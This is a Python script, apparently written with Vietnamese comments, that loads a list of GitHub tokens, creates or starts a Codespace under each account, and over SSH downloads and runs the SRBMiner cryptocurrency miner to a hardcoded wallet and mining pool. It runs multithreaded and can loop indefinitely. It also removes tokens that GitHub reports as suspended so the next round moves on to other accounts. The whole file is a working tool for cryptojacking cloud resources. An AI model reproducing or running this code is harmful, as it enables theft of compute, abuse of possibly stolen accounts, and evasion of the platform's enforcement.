import base64
import random
import string
import os
import requests
import subprocess
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

API = "https://api.github.com"
TOKENS_FILE = "tokens.txt"

README = """#

Hello World!
"""

README_B64 = base64.b64encode(README.encode()).decode()

file_lock = threading.Lock()


def rand_name():
    return "demo-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def load_tokens():
    if not os.path.exists(TOKENS_FILE):
        return []
    with open(TOKENS_FILE, "r", encoding="utf8") as f:
        return [i.strip() for i in f if i.strip()]


def remove_token(token):
    """Xoa 1 token khoi tokens.txt (thread-safe)."""
    with file_lock:
        tokens = load_tokens()
        if token in tokens:
            tokens.remove(token)
            with open(TOKENS_FILE, "w", encoding="utf8") as f:
                f.write("\n".join(tokens) + ("\n" if tokens else ""))
            print(f"[REMOVED] Da xoa token {token[:10]}... khoi {TOKENS_FILE}")


def is_suspended_response(status_code, body_text):
    """Kiem tra token bi suspend dua tren response cua GitHub API."""
    if status_code == 403 and "suspended" in body_text.lower():
        return True
    return False


def get_or_create_codespace(headers, token):
    """
    Tra ve (username, codespace_name, action)
    action: skip_available, run_new, run_existing, hoac None
    """
    r = requests.get(f"{API}/user", headers=headers, timeout=30)
    if r.status_code != 200:
        print("Token loi:", r.text)
        if is_suspended_response(r.status_code, r.text):
            remove_token(token)
        return None, None, None
    username = r.json()["login"]

    r = requests.get(f"{API}/user/codespaces", headers=headers, timeout=30)

    if r.status_code != 200:
        print(f"[{username}] List codespaces failed:", r.text)
        if is_suspended_response(r.status_code, r.text):
            remove_token(token)
        return None, None, None

    data = r.json()

    if data.get("total_count", 0) > 0:
        codespace = data["codespaces"][0]
        codespace_name = codespace["name"]
        state = codespace.get("state")

        print(f"[{username}] Found existing Codespace: {codespace_name} ({state})")

        # LOGIC MOI: Bo qua neu da Available tu truoc
        if state == "Available":
            print(f"[{username}] Initial state is Available -> bo qua.")
            return username, codespace_name, "skip_available"

        if state == "Shutdown":
            print(f"[{username}] Starting Codespace...")
            r = requests.post(
                f"{API}/user/codespaces/{codespace_name}/start",
                headers=headers,
                timeout=30
            )
            if r.status_code not in (200, 202):
                print(f"[{username}] Failed to start Codespace:", r.text)
                if is_suspended_response(r.status_code, r.text):
                    remove_token(token)
                return None, None, None

        # TOI DA 1 PHUT 20 GIAY (80 GIAY) CHO CODESPACE EXISTING
        start_time = time.time()
        while (time.time() - start_time) < 80:
            r = requests.get(
                f"{API}/user/codespaces/{codespace_name}",
                headers=headers,
                timeout=30
            )
            if r.status_code != 200:
                print(f"[{username}] Check codespace failed:", r.text)
                if is_suspended_response(r.status_code, r.text):
                    remove_token(token)
                return None, None, None

            state = r.json().get("state")
            print(f"[{username}] State: {state}")

            if state == "Available":
                print(f"[{username}] Codespace is ready.")
                return username, codespace_name, "run_existing"

            if state in ("Archived", "DeletionFailed", "CreationFailed"):
                print(f"[{username}] Codespace unusable: {state}")
                return None, None, None

            time.sleep(3)
        
        # HET THOI GIAN CHO
        print(f"[{username}] TIMEOUT: Khong dat Available sau 1m20s. Chuyen token khac.")
        return None, None, None

    # Tao moi
    repo = rand_name()

    r = requests.post(
        f"{API}/user/repos",
        headers=headers,
        json={"name": repo, "private": False},
        timeout=30
    )
    if r.status_code not in (200, 201):
        print(f"[{username}] Create repo failed:", r.text)
        if is_suspended_response(r.status_code, r.text):
            remove_token(token)
        return None, None, None
    print(f"[{username}] Repo created: {repo}")

    r = requests.put(
        f"{API}/repos/{username}/{repo}/contents/README.md",
        headers=headers,
        json={"message": "Add README", "content": README_B64},
        timeout=30
    )
    if r.status_code not in (200, 201):
        print(f"[{username}] README failed:", r.text)
        if is_suspended_response(r.status_code, r.text):
            remove_token(token)
        return None, None, None
    print(f"[{username}] No Codespace found. Creating...")

    r = requests.post(
        f"{API}/repos/{username}/{repo}/codespaces",
        headers=headers,
        json={"ref": "main", "machine": "standardLinux32gb"},
        timeout=30
    )

    if r.status_code not in (200, 201):
        print(f"[{username}] Create codespace failed:", r.text)
        if is_suspended_response(r.status_code, r.text):
            remove_token(token)
        return None, None, None

    codespace_name = r.json()["name"]
    print(f"[{username}] Created: {codespace_name}")

    # TOI DA 1 PHUT 20 GIAY (80 GIAY) CHO CODESPACE MOI
    start_time = time.time()
    while (time.time() - start_time) < 80:
        r = requests.get(
            f"{API}/user/codespaces/{codespace_name}",
            headers=headers,
            timeout=30
        )
        if r.status_code != 200:
            print(f"[{username}] Check codespace failed:", r.text)
            if is_suspended_response(r.status_code, r.text):
                remove_token(token)
            return None, None, None

        state = r.json().get("state")
        print(f"[{username}] State: {state}")

        if state == "Available":
            print(f"[{username}] Codespace is ready.")
            return username, codespace_name, "run_new"

        if state in ("Archived", "DeletionFailed", "CreationFailed"):
            print(f"[{username}] Codespace failed: {state}")
            return None, None, None

        time.sleep(3)
    
    # HET THOI GIAN CHO
    print(f"[{username}] TIMEOUT: Khong dat Available sau 1m20s. Chuyen token khac.")
    return None, None, None


def process(token):
    env = os.environ.copy()
    env["GH_TOKEN"] = token

    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28"
    }

    try:
        username, codespace_name, action = get_or_create_codespace(headers, token)

        if not codespace_name:
            print("Bo qua token nay do khong lay/tao duoc codespace.")
            return

        # LOGIC MOI: Phan loai command
        if action == "skip_available":
            print(f"[{username}] Da ready san -> KHONG chay command.")
            return
        elif action == "run_new":
            command = """
            sudo apt update
            sudo apt install -y wget tar
            wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
            tar -xzvf SRBMiner-Multi-3-4-3-Linux.tar.gz
            cd SRBMiner-Multi-3-4-3
            chmod +x SRBMiner-MULTI
            ./SRBMiner-MULTI --algorithm randomx --pool sg.qrl.herominers.com:1166 --wallet Q010500fb91085628f58cf279ab0148a9f3f05ad0a055044c6eefdead1c2235edf6c52689d8f3a6 --worker rig1
"""
        elif action == "run_existing":
            command = """
            sudo apt update
            sudo apt install -y wget tar
            wget https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
            tar -xzvf SRBMiner-Multi-3-4-3-Linux.tar.gz
            cd SRBMiner-Multi-3-4-3
            chmod +x SRBMiner-MULTI
            ./SRBMiner-MULTI --algorithm randomx --pool sg.qrl.herominers.com:1166 --wallet Q010500fb91085628f58cf279ab0148a9f3f05ad0a055044c6eefdead1c2235edf6c52689d8f3a6 --worker rig1
"""
        else:
            return

        # GIU NGUYEN CHINH XAC BAN CHAY DUOC CUA BAN
        print(f"[{username}] Executing commands on {codespace_name}...")
        result = subprocess.run(
            ["gh", "codespace", "ssh", "-c", codespace_name, "--", "bash", "-lc", command],
            env=env,
            capture_output=True,
            text=True,
            timeout=10
        )

        if result.stdout:
            print(f"[{username}] Output:\n{result.stdout}")
        if result.stderr:
            print(f"[{username}] Errors:\n{result.stderr}")

        if result.returncode == 0:
            print(f"[{username}] Done!")
        else:
            print(f"[{username}] Command failed with exit code {result.returncode}")

    except subprocess.TimeoutExpired:
        print("[TIMEOUT] Command timed out.")
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")


def run_one_round(threads):
    """Chay 1 vong qua toan bo token hien co trong tokens.txt."""
    tokens = load_tokens()

    if not tokens:
        print("tokens.txt rong hoac khong con token nao, dung lai.")
        return False

    print(f"\n===== BAT DAU VONG MOI: {len(tokens)} token =====")

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(process, token): token for token in tokens}

        for future in as_completed(futures):
            token = futures[future]
            try:
                future.result()
            except Exception as e:
                print(f"[LOI THREAD] token {token[:10]}...: {type(e).__name__}: {e}")

    return True


def ask_int(prompt, allow_zero_as_infinite=False):
    while True:
        try:
            value = int(input(prompt))
            if value > 0 or (allow_zero_as_infinite and value == 0):
                return value
            print("Vui long nhap so lon hon 0.")
        except ValueError:
            print("Vui long nhap so nguyen.")


def main():
    if not os.path.exists(TOKENS_FILE):
        print("Khong tim thay file tokens.txt")
        return

    tokens = load_tokens()
    if not tokens:
        print("tokens.txt rong, khong co token nao de chay.")
        return

    print(f"Da doc duoc {len(tokens)} token.")

    threads = ask_int("Nhap so luong: ")
    loops = ask_int(
        "Nhap so vong lap (nhap 0 de chay vo han quay lai tu dau): ",
        allow_zero_as_infinite=True
    )

    round_count = 0
    while True:
        round_count += 1
        print(f"\n########## VONG LAP #{round_count} ##########")

        has_tokens_left = run_one_round(threads)

        if not has_tokens_left:
            print("Het token kha dung. Dung chuong trinh.")
            break

        if loops != 0 and round_count >= loops:
            print(f"Da chay du {loops} vong lap theo yeu cau. Dung chuong trinh.")
            break

        print("Da chay het danh sach token trong vong nay. Quay lai tu token dau tien...")
        time.sleep(2)


if __name__ == "__main__":
    main()